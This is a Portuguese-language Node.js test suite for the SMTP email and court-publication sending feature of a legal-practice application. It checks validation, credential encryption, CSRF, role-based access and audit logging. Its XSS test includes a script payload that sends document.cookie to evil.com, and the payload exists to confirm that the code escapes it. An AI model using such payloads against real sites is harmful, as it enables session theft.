import { readFile, mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import assert from 'node:assert/strict';
import { chromium } from 'playwright';
import { SecurityManager, generateTotp } from '../lib/security.mjs';
import { EmailService } from '../lib/email/email-service.mjs';
import { postJson, startTestServer } from './helpers.mjs';

const ROOT = path.dirname(path.dirname(fileURLToPath(import.meta.url)));

console.log('\n===============================================================');
console.log('  ATRIUM — SUÍTE DE TESTES: MOTOR SMTP E ENVIO DE PUBLICAÇÃO');
console.log('===============================================================\n');

// 1. Testes Unitários do EmailService com Mock Transporter
console.log('[1/5] Testando EmailService isolado (criptografia, sanitização, XSS e templates)...');

const mockSentMessages = [];
const mockTransporter = {
  verify: async () => true,
  sendMail: async (opts) => {
    mockSentMessages.push(opts);
    return { messageId: 'mock-msg-12345' };
  }
};

const fakeFailingTransporter = {
  verify: async () => {
    const err = new Error('Invalid login: 535-5.7.8 Username and Password not accepted');
    err.code = 'EAUTH';
    err.responseCode = 535;
    throw err;
  },
  sendMail: async () => {
    throw new Error('Connection lost');
  }
};

const unitTestDir = await mkdtemp(path.join(tmpdir(), 'atrium-email-unit-test-'));

try {
  const testSec = new SecurityManager({
    dataDirectory: unitTestDir,
    sessionSecret: 'a'.repeat(48),
    encryptionKey: Buffer.alloc(32, 1).toString('base64'),
    secureCookies: false
  });
  await testSec.init();

  const emailService = new EmailService({
    dataDirectory: unitTestDir,
    securityManager: testSec,
    testTransporter: mockTransporter
  });

  // Teste de status inicial não configurado
  const initialStatus = await emailService.getStatus();
  assert.equal(initialStatus.configured, false, 'Status inicial deveria ser não configurado.');
  assert.equal(initialStatus.userMasked, '', 'Usuário mascarado inicial deve ser vazio.');

  // Teste de validação de campos obrigatórios
  await assert.rejects(
    () => emailService.configure({ host: '', port: 465, user: 'test', password: '123', fromAddress: 'a@b.com' }),
    /Informe o servidor SMTP/,
    'Deveria rejeitar host vazio.'
  );
  await assert.rejects(
    () => emailService.configure({ host: 'smtp.exemplo.com', port: 99999, user: 'test', password: '123', fromAddress: 'a@b.com' }),
    /Informe uma porta SMTP válida/,
    'Deveria rejeitar porta inválida.'
  );
  await assert.rejects(
    () => emailService.configure({ host: 'smtp.exemplo.com', port: 465, user: '', password: '123', fromAddress: 'a@b.com' }),
    /Informe o usuário/,
    'Deveria rejeitar usuário vazio.'
  );
  await assert.rejects(
    () => emailService.configure({ host: 'smtp.exemplo.com', port: 465, user: 'test', password: '', fromAddress: 'a@b.com' }),
    /Informe a senha SMTP/,
    'Deveria rejeitar senha vazia.'
  );
  await assert.rejects(
    () => emailService.configure({ host: 'smtp.exemplo.com', port: 465, user: 'test', password: '123', fromAddress: 'invalido' }),
    /Informe um e-mail de remetente válido/,
    'Deveria rejeitar e-mail de remetente inválido.'
  );

  // Tentativa de envio de publicação com SMTP não configurado
  await assert.rejects(
    () => emailService.sendPublicationEmail({
      recipient: 'cliente@exemplo.com.br',
      publication: { id: 'pub-001', text: 'Texto de teste' }
    }),
    /A integração de e-mail ainda não foi configurada/,
    'Deveria rejeitar envio de publicação se SMTP não estiver configurado.'
  );

  // Teste de configuração com sucesso
  const configResult = await emailService.configure({
    host: 'smtp.escritorio.adv.br',
    port: 465,
    secure: true,
    user: 'advogado.titular@escritorio.adv.br',
    password: 'Segredo-Ultra-Secreto-12345!',
    fromName: 'Dr. Advogado Titular',
    fromAddress: 'contato@escritorio.adv.br'
  });

  assert.equal(configResult.configured, true, 'Deveria estar configurado após configure().');
  assert.equal(configResult.host, 'smtp.escritorio.adv.br', 'Host retornado incorreto.');
  assert.equal(configResult.port, 465, 'Porta retornada incorreta.');
  assert.equal(configResult.secure, true, 'Flag secure retornada incorreta.');
  assert.equal(configResult.userMasked, 'ad***@escritorio.adv.br', 'Usuário não foi mascarado corretamente.');
  assert.equal(configResult.password, undefined, 'A senha NUNCA pode ser devolvida no status.');
  assert.equal(configResult.fromName, 'Dr. Advogado Titular', 'Nome do remetente incorreto.');
  assert.equal(configResult.fromAddress, 'contato@escritorio.adv.br', 'E-mail do remetente incorreto.');

  // Teste de persistência criptografada em repouso
  const emailFile = await readFile(path.join(unitTestDir, 'email-integrations.json'), 'utf8');
  assert(!emailFile.includes('Segredo-Ultra-Secreto-12345!'), 'A senha SMTP ficou em texto plano no disco!');
  assert(emailFile.includes('aes-256-gcm'), 'O envelope de credenciais de e-mail não utiliza AES-256-GCM.');

  // Teste de envio de e-mail de teste
  const testSendResult = await emailService.sendTestEmail({ recipient: 'cliente.teste@juris.adv.br' });
  assert.equal(testSendResult.ok, true, 'Envio de teste deveria retornar ok: true.');
  assert.equal(mockSentMessages.length, 1, 'Deveria ter enviado 1 mensagem de teste.');
  const sentMsg = mockSentMessages[0];
  assert.equal(sentMsg.to, 'cliente.teste@juris.adv.br', 'Destinatário da mensagem incorreto.');
  assert.equal(sentMsg.from, '"Dr. Advogado Titular" <contato@escritorio.adv.br>', 'Remetente formatado incorreto.');
  assert.equal(sentMsg.subject, 'ATRIUM — Teste de integração de e-mail', 'Assunto do e-mail de teste incorreto.');
  assert(sentMsg.text.includes('A integração de e-mail do Atrium está funcionando corretamente'), 'Corpo do texto incorreto.');

  // Teste de envio de publicação com número de processo (Assunto dinâmico)
  const pubWithProcess = {
    id: 'pub-proc-100',
    process: '5001234-56.2026.4.04.7105',
    client: 'Empresa Teste de Serviços LTDA',
    court: 'TRF4 — 1ª Vara Federal',
    publishedAt: '2026-08-26',
    source: 'DJEN Oficial',
    term: 'Dr. Advogado Titular · OAB/RS 000000',
    text: 'Intimação para manifestação sobre laudo contábil no prazo de 15 dias úteis. Conforme Art. 219 do CPC/2015 & decisão liminar.'
  };

  const pubResult = await emailService.sendPublicationEmail({
    recipient: 'cliente@empresa.com.br',
    publication: pubWithProcess
  });
  assert.equal(pubResult.ok, true, 'Envio de publicação deveria retornar ok: true.');
  const sentPubMsg = mockSentMessages[mockSentMessages.length - 1];

  assert.equal(sentPubMsg.to, 'cliente@empresa.com.br', 'Destinatário da publicação incorreto.');
  assert.equal(sentPubMsg.subject, 'ATRIUM — Publicação judicial — 5001234-56.2026.4.04.7105', 'Assunto com processo incorreto.');
  assert(sentPubMsg.text.includes('5001234-56.2026.4.04.7105'), 'Texto plano não contém processo.');
  assert(sentPubMsg.text.includes('Empresa Teste de Serviços LTDA'), 'Texto plano não contém cliente.');
  assert(sentPubMsg.text.includes('TRF4 — 1ª Vara Federal'), 'Texto plano não contém tribunal.');
  assert(sentPubMsg.text.includes('26/08/2026') || sentPubMsg.text.includes('2026-08-26'), 'Texto plano não contém data.');
  assert(sentPubMsg.text.includes('DJEN Oficial'), 'Texto plano não contém fonte.');
  assert(sentPubMsg.text.includes('Art. 219 do CPC/2015 & decisão liminar.'), 'Texto plano não preservou conteúdo original.');
  assert(sentPubMsg.text.includes('Esta mensagem foi enviada pelo ATRIUM'), 'Texto plano não contém rodapé de segurança.');

  // Teste de envio de publicação SEM número de processo (Fallback do assunto)
  const pubWithoutProcess = {
    id: 'pub-no-proc-200',
    client: 'Pessoa Sem Processo',
    text: 'Despacho administrativo sem numeração judicial vinculada.'
  };
  await emailService.sendPublicationEmail({
    recipient: 'contato@pessoa.com.br',
    publication: pubWithoutProcess
  });
  const sentPubNoProc = mockSentMessages[mockSentMessages.length - 1];
  assert.equal(sentPubNoProc.subject, 'ATRIUM — Nova publicação judicial', 'Fallback de assunto sem processo incorreto.');

  // Teste de Segurança XSS e Escape HTML rigoroso
  const maliciousPub = {
    id: 'pub-xss-999',
    process: '<script>alert("process-xss")</script>',
    client: '<img src=x onerror=alert(1)>',
    court: '<b>Tribunal Injetado</b>',
    source: '"Fonte Injetada"',
    term: '\'Termo Injetado\'',
    text: 'Aviso importante: <script>document.location="http://evil.com/?c="+document.cookie</script> & <b>negrito</b> "aspas duplas" e \'aspas simples\'.'
  };

  await emailService.sendPublicationEmail({
    recipient: 'seguranca@escritorio.adv.br',
    publication: maliciousPub
  });
  const xssMail = mockSentMessages[mockSentMessages.length - 1];

  // Nenhuma tag perigosa pode estar em texto puro no HTML
  assert(!xssMail.html.includes('<script>'), 'HTML vazou tag <script>!');
  assert(!xssMail.html.includes('<img'), 'HTML vazou tag <img>!');
  assert(!xssMail.html.includes('<b>Tribunal Injetado</b>'), 'HTML vazou tag <b> não escapada no cabeçalho!');
  assert(xssMail.html.includes('&lt;script&gt;alert(&quot;process-xss&quot;)&lt;/script&gt;'), 'XSS no processo não foi escapado.');
  assert(xssMail.html.includes('&lt;img src=x onerror=alert(1)&gt;'), 'XSS no cliente não foi escapado.');
  assert(xssMail.html.includes('&amp;'), '& não foi escapado como &amp;.');
  assert(xssMail.html.includes('&quot;aspas duplas&quot;'), 'Aspas duplas não foram escapadas.');
  assert(xssMail.html.includes('&#39;aspas simples&#39;'), 'Aspas simples não foram escapadas.');

  // Teste de validação de destinatário na publicação
  await assert.rejects(
    () => emailService.sendPublicationEmail({ recipient: 'invalido', publication: pubWithProcess }),
    /Informe um endereço de e-mail de destinatário válido/,
    'Deveria rejeitar destinatário inválido no envio de publicação.'
  );

  // Teste de erro amigável/higienizado em caso de falha SMTP
  const failingService = new EmailService({
    dataDirectory: unitTestDir,
    securityManager: testSec,
    testTransporter: fakeFailingTransporter
  });
  await assert.rejects(
    () => failingService.configure({
      host: 'smtp.gmail.com',
      port: 465,
      secure: true,
      user: 'usuario@gmail.com',
      password: 'senha-errada-secreta',
      fromAddress: 'usuario@gmail.com'
    }),
    (err) => {
      assert(!err.message.includes('senha-errada-secreta'), 'O erro vazou a senha do usuário!');
      assert(err.message.includes('Falha de autenticação SMTP'), 'Deveria conter mensagem amigável.');
      return true;
    },
    'Deveria rejeitar com erro amigável sem expor segredos.'
  );

  console.log('✓ EmailService isolado (Unit Tests, XSS, Templates e Criptografia) 100% aprovado.');
} finally {
  await rm(unitTestDir, { recursive: true, force: true });
}

// 2. Testes de Integração HTTP via Servidor Real (Autenticação, RBAC e CSRF)
console.log('\n[2/5] Testando endpoints HTTP de e-mail com autenticação e CSRF...');

const server = await startTestServer();
const adminPassword = 'Senha-Segura-2026!';
const collaboratorPassword = 'Colaborador-2026!';

try {
  // Testes sem autenticação (deve retornar 401)
  let res = await fetch(`${server.baseUrl}/api/integrations/email/status`);
  assert.equal(res.status, 401, 'Status de e-mail acessível sem autenticação!');

  res = await postJson(`${server.baseUrl}/api/integrations/email/configure`, { host: 'smtp.test.com' });
  assert.equal(res.status, 401, 'Configure de e-mail acessível sem autenticação!');

  res = await postJson(`${server.baseUrl}/api/integrations/email/test`, { recipient: 'test@test.com' });
  assert.equal(res.status, 401, 'Test de e-mail acessível sem autenticação!');

  res = await postJson(`${server.baseUrl}/api/intimations/email`, { publicationId: 'pub-001', recipient: 'test@test.com' });
  assert.equal(res.status, 401, 'Envio de publicação acessível sem autenticação!');

  // Setup do Administrador Principal (Master Admin)
  res = await postJson(`${server.baseUrl}/api/auth/setup`, { username: 'admin', displayName: 'Admin Titular', password: adminPassword });
  const setupData = await res.json();
  res = await postJson(`${server.baseUrl}/api/auth/setup/verify`, { setupToken: setupData.setupToken, code: generateTotp(setupData.manualSecret) });
  const verified = await res.json();
  const adminCookie = res.headers.get('set-cookie').split(';')[0];
  const adminCsrf = verified.csrfToken;

  // Status inicial autenticado (Admin)
  res = await fetch(`${server.baseUrl}/api/integrations/email/status`, { headers: { Cookie: adminCookie } });
  assert.equal(res.status, 200, 'Status autenticado falhou.');
  let statusBody = await res.json();
  assert.equal(statusBody.ok, true);
  assert.equal(statusBody.status.configured, false);
  assert.equal(statusBody.status.password, undefined, 'A senha apareceu no status público!');

  // Tentativa de POST pelo Admin sem CSRF (deve retornar 403)
  res = await postJson(`${server.baseUrl}/api/integrations/email/configure`, {
    host: 'smtp.teste.com',
    port: 465,
    secure: true,
    user: 'admin@teste.com',
    password: 'AppPassword123!',
    fromAddress: 'admin@teste.com'
  }, { Cookie: adminCookie });
  assert.equal(res.status, 403, 'POST de configuração foi aceito sem token CSRF!');

  res = await postJson(`${server.baseUrl}/api/integrations/email/test`, {
    recipient: 'destino@teste.com'
  }, { Cookie: adminCookie });
  assert.equal(res.status, 403, 'POST de teste de e-mail foi aceito sem token CSRF!');

  res = await postJson(`${server.baseUrl}/api/intimations/email`, {
    publicationId: 'pub-001',
    recipient: 'destino@teste.com'
  }, { Cookie: adminCookie });
  assert.equal(res.status, 403, 'POST de envio de publicação foi aceito sem token CSRF!');

  // Cadastro e Aprovação de um Colaborador
  res = await postJson(`${server.baseUrl}/api/auth/register`, {
    username: 'colaborador',
    displayName: 'Pessoa Colaboradora',
    email: 'colaborador@escritorio.adv.br',
    password: collaboratorPassword
  });
  const regData = await res.json();
  res = await postJson(`${server.baseUrl}/api/auth/register/verify`, {
    setupToken: regData.setupToken,
    code: generateTotp(regData.manualSecret)
  });
  assert.equal(res.status, 200, 'Registro de colaborador falhou.');

  // Admin aprova o colaborador
  res = await fetch(`${server.baseUrl}/api/auth/users`, { headers: { Cookie: adminCookie } });
  const usersList = (await res.json()).users;
  const collabUser = usersList.find(u => u.username === 'colaborador');
  assert(collabUser, 'Colaborador não encontrado na lista.');

  res = await postJson(`${server.baseUrl}/api/auth/users/manage`, {
    userId: collabUser.id,
    status: 'active'
  }, { Cookie: adminCookie, 'X-CSRF-Token': adminCsrf });
  assert.equal(res.status, 200, 'Aprovação de colaborador falhou.');

  // Login do Colaborador
  res = await postJson(`${server.baseUrl}/api/auth/login`, {
    username: 'colaborador',
    password: collaboratorPassword,
    code: generateTotp(regData.manualSecret)
  });
  assert.equal(res.status, 200, 'Login do colaborador falhou.');
  const collabLogin = await res.json();
  const collabCookie = res.headers.get('set-cookie').split(';')[0];
  const collabCsrf = collabLogin.csrfToken;
  assert.equal(collabLogin.user.role, 'collaborator', 'Role do colaborador deveria ser collaborator.');

  console.log('✓ Autenticação e CSRF validados.');

  // 3. Testes de Controle de Acesso Baseado em Função (RBAC)
  console.log('\n[3/5] Testando autorização de e-mail por perfil (Admin vs Colaborador)...');

  // COLABORADOR: GET status deve ser PERMITIDO (status higienizado)
  res = await fetch(`${server.baseUrl}/api/integrations/email/status`, { headers: { Cookie: collabCookie } });
  assert.equal(res.status, 200, 'Colaborador deveria conseguir consultar status higienizado de e-mail.');
  const collabStatus = await res.json();
  assert.equal(collabStatus.ok, true);
  assert.equal(collabStatus.status.password, undefined, 'A senha apareceu na consulta do colaborador!');

  // COLABORADOR: POST configure + CSRF deve ser BLOQUEADO com 403
  res = await postJson(`${server.baseUrl}/api/integrations/email/configure`, {
    host: 'smtp.hacker.com',
    port: 587,
    secure: false,
    user: 'colaborador@escritorio.adv.br',
    password: 'Tentativa-Nao-Autorizada',
    fromAddress: 'colaborador@escritorio.adv.br'
  }, { Cookie: collabCookie, 'X-CSRF-Token': collabCsrf });
  assert.equal(res.status, 403, 'Colaborador conseguiu chamar POST /api/integrations/email/configure!');
  const collabConfigErr = await res.json();
  assert(
    collabConfigErr.message.includes('não possui permissão') || collabConfigErr.message.includes('administrar'),
    'Mensagem de 403 do colaborador incorreta.'
  );

  // COLABORADOR: POST test + CSRF deve ser BLOQUEADO com 403
  res = await postJson(`${server.baseUrl}/api/integrations/email/test`, {
    recipient: 'qualquer@destino.com'
  }, { Cookie: collabCookie, 'X-CSRF-Token': collabCsrf });
  assert.equal(res.status, 403, 'Colaborador conseguiu chamar POST /api/integrations/email/test!');
  const collabTestErr = await res.json();
  assert(
    collabTestErr.message.includes('não possui permissão') || collabTestErr.message.includes('administrar'),
    'Mensagem de 403 do teste do colaborador incorreta.'
  );

  // COLABORADOR: POST publication email + CSRF deve ser BLOQUEADO com 403
  res = await postJson(`${server.baseUrl}/api/intimations/email`, {
    publicationId: 'pub-001',
    recipient: 'qualquer@destino.com'
  }, { Cookie: collabCookie, 'X-CSRF-Token': collabCsrf });
  assert.equal(res.status, 403, 'Colaborador conseguiu chamar POST /api/intimations/email!');
  const collabPubErr = await res.json();
  assert(
    collabPubErr.message.includes('não possui permissão'),
    'Mensagem de 403 do envio de publicação pelo colaborador incorreta.'
  );

  // ADMIN: POST com parâmetros inválidos é autorizado pelo RBAC e chega na validação (400)
  res = await postJson(`${server.baseUrl}/api/integrations/email/configure`, {
    host: 'smtp.teste.com',
    port: 465,
    secure: true,
    user: 'admin@teste.com',
    password: 'AppPassword123!',
    fromAddress: 'endereco-invalido'
  }, { Cookie: adminCookie, 'X-CSRF-Token': adminCsrf });
  assert.equal(res.status, 400, 'Admin deveria ter acesso autorizado e passar pela validação de formato.');

  res = await postJson(`${server.baseUrl}/api/integrations/email/test`, {
    recipient: 'destinatario-invalido'
  }, { Cookie: adminCookie, 'X-CSRF-Token': adminCsrf });
  assert.equal(res.status, 400, 'Admin deveria ter acesso autorizado e passar pela validação de formato.');

  console.log('✓ Controle de acesso administrativo (Admin vs Colaborador) 100% verificado.');

  // 4. Testes de Envio Manual de Publicação por E-mail (Fluxo Completo no Servidor)
  console.log('\n[4/5] Testando fluxo de envio de publicação por e-mail no servidor real...');

  // Adicionar uma publicação judicial legítima ao estado persistido
  res = await fetch(`${server.baseUrl}/api/state`, { headers: { Cookie: adminCookie } });
  const appStateData = await res.json();
  const stateToUpdate = appStateData.state || {};
  stateToUpdate.intimations = stateToUpdate.intimations || [];

  const canonicalTestPublication = {
    id: 'int-canon-777',
    title: 'Intimação para Manifestação sobre Laudo Pericial',
    process: '5002086-73.2022.4.04.7133',
    client: 'Roberto Roque Junges',
    court: 'TRF4 — 2ª Vara Federal de Novo Hamburgo',
    publishedAt: '2026-08-26',
    source: 'DJEN Oficial',
    term: 'Dr. Advogado Titular · OAB/RS 000000',
    text: 'Fica a parte autora intimada a apresentar manifestação circunstanciada sobre o laudo pericial médico no prazo de 15 (quinze) dias.',
    status: 'nova',
    unread: true,
    createdAt: new Date().toISOString()
  };
  stateToUpdate.intimations.push(canonicalTestPublication);

  res = await postJson(`${server.baseUrl}/api/state`, { state: stateToUpdate }, { Cookie: adminCookie, 'X-CSRF-Token': adminCsrf });
  assert.equal(res.status, 200, 'Falha ao salvar estado inicial com intimação.');

  // Tentativa de envio com publicação inexistente (deve retornar 404)
  res = await postJson(`${server.baseUrl}/api/intimations/email`, {
    publicationId: 'id-que-nao-existe-no-banco',
    recipient: 'advogado@escritorio.adv.br'
  }, { Cookie: adminCookie, 'X-CSRF-Token': adminCsrf });
  assert.equal(res.status, 404, 'Deveria retornar 404 para publicação inexistente.');

  // Tentativa de envio com destinatário inválido (deve retornar 400)
  res = await postJson(`${server.baseUrl}/api/intimations/email`, {
    publicationId: 'int-canon-777',
    recipient: 'email-completamente-invalido'
  }, { Cookie: adminCookie, 'X-CSRF-Token': adminCsrf });
  assert.equal(res.status, 400, 'Deveria retornar 400 para destinatário inválido.');

  // Configurar SMTP no servidor como Admin
  res = await postJson(`${server.baseUrl}/api/integrations/email/configure`, {
    host: 'smtp.servidor-teste.adv.br',
    port: 465,
    secure: true,
    user: 'master@servidor-teste.adv.br',
    password: 'Senha-Super-Secreta-12345!',
    fromName: 'Escritório Keller & Associados',
    fromAddress: 'notificacoes@servidor-teste.adv.br'
  }, { Cookie: adminCookie, 'X-CSRF-Token': adminCsrf });
  assert.equal(res.status, 200, 'Configuração SMTP pelo Admin falhou.');

  // Envio de publicação via HTTP (com tentativa de injeção de subject, html ou text pelo cliente)
  // O servidor DEVE ignorar subject/html/text enviados pelo cliente e processar a publicação canônica
  res = await postJson(`${server.baseUrl}/api/intimations/email`, {
    publicationId: 'int-canon-777',
    recipient: 'cliente.roberto@gmail.com',
    subject: 'ASSUNTO FORJADO PELO CLIENTE',
    html: '<h1>CONTEUDO FORJADO PELO CLIENTE</h1>',
    text: 'TEXTO FORJADO PELO CLIENTE'
  }, { Cookie: adminCookie, 'X-CSRF-Token': adminCsrf });

  assert.equal(res.status, 200, 'Envio de publicação falhou.');
  const sendResp = await res.json();
  assert.equal(sendResp.ok, true, 'Resposta não continha ok: true.');
  assert(sendResp.message.includes('Publicação enviada com sucesso'), 'Mensagem de sucesso incorreta.');

  // Validação de Imutabilidade da Intimação: Enviar e-mail NÃO altera status nem unread
  res = await fetch(`${server.baseUrl}/api/state`, { headers: { Cookie: adminCookie } });
  const postStateData = await res.json();
  const refreshedPublication = (postStateData.state?.intimations || []).find(i => i.id === 'int-canon-777');
  assert(refreshedPublication, 'Publicação sumiu do estado!');
  assert.equal(refreshedPublication.status, 'nova', 'O status da intimação foi indevidamente alterado ao enviar e-mail!');
  assert.equal(refreshedPublication.unread, true, 'A flag unread foi indevidamente alterada ao enviar e-mail!');

  // Validação do Audit Log: Ação registrada com destinatário mascarado e sem senhas
  const auditList = postStateData.state?.audit || [];
  const emailAudit = auditList.find(a => a.action === 'Publicação enviada por e-mail');
  assert(emailAudit, 'Auditoria de envio de publicação não encontrada!');
  assert(emailAudit.detail.includes('cl***@gmail.com'), 'Destinatário no audit log não foi mascarado.');
  assert(emailAudit.detail.includes('5002086-73.2022.4.04.7133') || emailAudit.detail.includes('int-canon-777'), 'Audit log não indicou a publicação.');

  for (const entry of auditList) {
    assert(!entry.detail?.includes('Senha-Super-Secreta-12345!'), 'Senha SMTP vazou no audit log!');
  }

  console.log('✓ Envio manual de publicação por e-mail 100% verificado no servidor real.');

  // 5. Testes E2E no DOM Real via Playwright (Master Admin vs Admin vs Collaborator)
  console.log('\n[5/5] Testando visibilidade do botão e abertura de modal no DOM real via Playwright...');

  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext({ viewport: { width: 1440, height: 900 } });
  const page = await context.newPage();

  try {
    // 5.1 MASTER ADMIN (role: master_admin):
    // Realiza login com a conta 'admin'
    await page.goto(server.baseUrl, { waitUntil: 'networkidle' });
    await page.locator('#authLoginForm.active').waitFor();
    await page.locator('#authLoginForm [name="username"]').fill('admin');
    await page.locator('#authLoginForm [name="password"]').fill(adminPassword);
    await page.locator('#authLoginForm [name="code"]').fill(generateTotp(setupData.manualSecret));
    await page.locator('#authLoginForm button[type="submit"]').click();
    await page.locator('#appShell:not(.hidden)').waitFor();

    // Desativa tour guiado no DOM do teste
    await page.evaluate(() => {
      localStorage.setItem('jurisflow_tour_seen', 'true');
      localStorage.setItem('atrium_tour_seen', 'true');
      window.KellerCentral?.App?.closeGuidedTour?.();
      document.getElementById('guidedTourBackdrop')?.classList.add('hidden');
    });

    // Abrir aba Publicações & DJEN
    await page.locator('button[data-view="inbox"]').click();
    await page.locator('#view-inbox.active').waitFor();

    // Clicar na publicação de teste
    const pubRowMaster = page.locator(`.inbox-row[data-intimation-id="${canonicalTestPublication.id}"]`);
    await pubRowMaster.waitFor();
    await pubRowMaster.click();

    // Validar que o botão [ ✉️ Enviar por e-mail ] EXISTE e ESTÁ VISÍVEL para Master Admin
    const emailBtnMaster = page.locator('#intimationDetail [data-detail-action="send-email"]');
    assert.equal(await emailBtnMaster.count(), 1, 'Botão de enviar por e-mail não foi renderizado para master_admin!');
    assert(await emailBtnMaster.isVisible(), 'Botão de enviar por e-mail não está visível para master_admin!');

    // Clicar no botão e verificar abertura do modal
    await emailBtnMaster.click();
    const emailModal = page.locator('#publicationEmailBackdrop');
    await emailModal.waitFor({ state: 'visible' });
    assert.equal(await emailModal.isVisible(), true, 'Modal de envio de publicação não abriu ao clicar!');
    assert.equal(await page.locator('#publicationEmailIdInput').inputValue(), canonicalTestPublication.id, 'ID no modal incorreto.');

    // Fechar modal pelo botão Cancelar
    await page.locator('#publicationEmailCancel').click();
    await emailModal.waitFor({ state: 'hidden' });

    // 5.2 ADMIN (role: admin):
    // Cadastrar e ativar um admin secundário
    const admin2Password = 'Admin-Secundario-2026!';
    const regRes = await postJson(`${server.baseUrl}/api/auth/register`, {
      username: 'admin2',
      displayName: 'Admin Secundário',
      email: 'admin2@escritorio.adv.br',
      password: admin2Password
    });
    const reg2Data = await regRes.json();
    await postJson(`${server.baseUrl}/api/auth/register/verify`, {
      setupToken: reg2Data.setupToken,
      code: generateTotp(reg2Data.manualSecret)
    });

    // Master Admin aprova admin2 e define papel como 'admin'
    const usersListRes = await fetch(`${server.baseUrl}/api/auth/users`, { headers: { Cookie: adminCookie } });
    const allUsers = (await usersListRes.json()).users;
    const admin2User = allUsers.find(u => u.username === 'admin2');
    assert(admin2User, 'admin2 não encontrado na lista de usuários.');

    await postJson(`${server.baseUrl}/api/auth/users/manage`, {
      userId: admin2User.id,
      status: 'active',
      role: 'admin'
    }, { Cookie: adminCookie, 'X-CSRF-Token': adminCsrf });

    // Logout do Master Admin
    await page.evaluate(() => window.KellerAuth?.logout());
    await page.locator('#authLoginForm.active').waitFor();

    // Login do Admin Secundário
    await page.locator('#authLoginForm [name="username"]').fill('admin2');
    await page.locator('#authLoginForm [name="password"]').fill(admin2Password);
    await page.locator('#authLoginForm [name="code"]').fill(generateTotp(reg2Data.manualSecret));
    await page.locator('#authLoginForm button[type="submit"]').click();
    await page.locator('#appShell:not(.hidden)').waitFor();

    // Abrir aba Publicações e detalhe
    await page.locator('button[data-view="inbox"]').click();
    await page.locator('#view-inbox.active').waitFor();
    await page.locator(`.inbox-row[data-intimation-id="${canonicalTestPublication.id}"]`).click();

    // Validar que o botão EXISTE e ESTÁ VISÍVEL para Admin
    const emailBtnAdmin = page.locator('#intimationDetail [data-detail-action="send-email"]');
    assert.equal(await emailBtnAdmin.count(), 1, 'Botão de enviar por e-mail não foi renderizado para admin!');
    assert(await emailBtnAdmin.isVisible(), 'Botão de enviar por e-mail não está visível para admin!');

    // Clicar e verificar abertura do modal
    await emailBtnAdmin.click();
    await emailModal.waitFor({ state: 'visible' });
    await page.locator('#publicationEmailClose').click();
    await emailModal.waitFor({ state: 'hidden' });

    // 5.3 COLLABORATOR (role: collaborator):
    // Logout do Admin
    await page.evaluate(() => window.KellerAuth?.logout());
    await page.locator('#authLoginForm.active').waitFor();

    // Login do Colaborador
    await page.locator('#authLoginForm [name="username"]').fill('colaborador');
    await page.locator('#authLoginForm [name="password"]').fill(collaboratorPassword);
    await page.locator('#authLoginForm [name="code"]').fill(generateTotp(regData.manualSecret));
    await page.locator('#authLoginForm button[type="submit"]').click();
    await page.locator('#appShell:not(.hidden)').waitFor();

    // Abrir aba Publicações e detalhe
    await page.locator('button[data-view="inbox"]').click();
    await page.locator('#view-inbox.active').waitFor();
    await page.locator(`.inbox-row[data-intimation-id="${canonicalTestPublication.id}"]`).click();

    // Validar que o botão NÃO EXISTE no DOM para Colaborador
    const emailBtnCollab = page.locator('#intimationDetail [data-detail-action="send-email"]');
    assert.equal(await emailBtnCollab.count(), 0, 'Botão de enviar por e-mail foi renderizado indevidamente para colaborador!');

    console.log('✓ Visibilidade no DOM e abertura de modal (Master Admin, Admin, Collaborator) 100% validados.');
  } finally {
    await browser.close();
  }
} finally {
  await server.stop();
}

console.log('\n===============================================================');
console.log('  SUÍTE DE TESTES DE E-MAIL (SMTP, RBAC & PUBLICAÇÃO): 100% APROVADA!');
console.log('===============================================================\n');
